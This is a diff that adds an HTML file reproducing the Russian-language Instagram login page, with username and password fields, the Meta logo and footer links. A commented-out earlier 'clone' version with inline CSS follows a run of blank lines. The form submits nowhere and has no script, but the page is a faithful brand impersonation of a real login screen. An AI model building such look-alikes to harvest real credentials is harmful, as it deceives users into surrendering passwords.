@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<main class="container">
+    <section class="hero-section">
+        <h1>Посмотрите, какими моментами из жизни поделились ваши <span class="gradient-text">близкие друзья.</span></h1>
+        
+        <div class="image-stack">
+            <img src="instagram-friends.webp" alt="Story 1" class="card">
+        </div>
+    </section>
+
+    <section class="login-container">
+        <div class="login-card">
+            <h2 class="login-title">Войти в Instagram</h2>
+            
+            <form class="login-form">
+                <input type="text" placeholder="Имя пользователя, номер..." aria-label="Username">
+                <input type="password" placeholder="Пароль" aria-label="Password">
+                <button type="submit" class="btn-primary">Войти</button>
+            </form>
+
+            <a href="#" class="link-secondary small">Забыли пароль?</a>
+
+            <div class="divider">
+                <span>ИЛИ</span>
+            </div>
+
+            <button class="btn-facebook">
+                <span class="fb-icon">f</span> Войти через Facebook
+            </button>
+        </div>
+
+        <div class="signup-card">
+            <p>У вас еще нет аккаунта? <a href="#">Создать новый аккаунт</a></p>
+        </div>
+        
+        <div class="meta-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" width="60">
+        </div>
+    </section>
+</main>
+
+<footer class="footer">
+    <nav class="footer-links">
+        <a href="#">Мета</a> <a href="#">Информация</a> <a href="#">Блог</a> <a href="#">Вакансии</a> 
+        <a href="#">Помощь</a> <a href="#">API</a> <a href="#">Конфиденциальность</a>
+    </nav>
+    <div class="footer-copyright">
+
+
+
+
+
+
+
+        <!-- <!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Clone</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fff; color: #262626; display: flex; flex-direction: column; min-height: 100vh; }
+
+        /* Main Container */
+        main { flex: 1; display: flex; align-items: center; justify-content: center; max-width: 1100px; margin: 0 auto; width: 100%; padding: 20px; }
+
+        /* Left Side: Marketing */
+        .hero-section { flex: 1; text-align: center; padding-right: 40px; }
+        .hero-section h1 { font-size: 36px; font-weight: 400; line-height: 1.4; margin-bottom: 30px; }
+        .hero-section .gradient-text { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 600; }
+        .hero-images { position: relative; height: 400px; display: flex; justify-content: center; align-items: center; }
+        .hero-images img { border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 240px; position: absolute; }
+        /* Simple stacking effect */
+        .img-1 { transform: rotate(-10deg) translateX(-60px); z-index: 1; width: 200px !important; }
+        .img-2 { z-index: 2; border: 4px solid white; }
+        .img-3 { transform: rotate(10deg) translateX(60px); z-index: 1; width: 200px !important; }
+
+        /* Right Side: Login Form */
+        .login-section { width: 350px; display: flex; flex-direction: column; gap: 15px; }
+        .login-box { background: white; padding: 20px; border: 1px solid #dbdbdb; border-radius: 1px; text-align: center; }
+        .logo { width: 175px; margin: 20px auto 35px; display: block; }
+        
+        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 12px; }
+        button.login-btn { width: 100%; background-color: #0095f6; border: none; color: white; padding: 7px; border-radius: 8px; font-weight: 600; cursor: pointer; opacity: 0.7; margin: 10px 0; }
+        
+        .separator { display: flex; align-items: center; margin: 15px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .separator::before, .separator::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
+        
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin: 20px 0; }
+        .forgot-pwd { font-size: 12px; color: #00376b; text-decoration: none; }
+        .signup-box { border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; }
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
+
+        /* Footer */
+        footer { padding: 40px 20px; font-size: 12px; color: #8e8e8e; text-align: center; }
+        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 15px; }
+        .footer-links a { text-decoration: none; color: #8e8e8e; }
+
+        @media (max-width: 875px) {
+            .hero-section { display: none; }
+            main { justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+
+<main>
+    <div class="hero-section">
+        <h1>Посмотрите, какими моментами из жизни поделились ваши <span class="gradient-text">близкие друзья.</span></h1>
+        <div class="hero-images">
+            <img src="https://via.placeholder.com/240x400/FFB6C1" class="img-1" alt="Friend post">
+            <img src="https://via.placeholder.com/240x400/ADD8E6" class="img-2" alt="Friend post">
+            <img src="https://via.placeholder.com/240x400/98FB98" class="img-3" alt="Friend post">
+        </div>
+    </div>
+
+    <div class="login-section">
+        <div class="login-box">
+            <h2 style="font-weight: 600; margin-bottom: 20px; text-align: left; font-size: 16px;">Войти в Instagram</h2>
+            <form>
+                <input type="text" placeholder="Имя пользователя, номер мобильного телефона или электронная почта">
+                <input type="password" placeholder="Пароль">
+                <button type="button" class="login-btn">Войти</button>
+            </form>
+            <a href="#" class="forgot-pwd">Забыли пароль?</a>
+            <div class="separator">ИЛИ</div>
+            <a href="#" class="fb-login">Войти через Facebook</a>
+        </div>
+        
+        <div class="signup-box">
+            <p>У вас еще нет аккаунта? <a href="#">Создать новый аккаунт</a></p>
+        </div>
+    </div>
+</main>
+
+<footer>
+    <div class="footer-links">
+        <a href="#">Meta</a> <a href="#">Информация</a> <a href="#">Блог</a> <a href="#">Вакансии</a> 
+        <a href="#">Помощь</a> <a href="#">API</a> <a href="#">Конфиденциальность</a> <a href="#">Условия</a>
+    </div>
+    <p>Русский ⌵ &copy; 2026 Instagram from Meta</p>
+</footer>
+
+</body>
+</html> -->
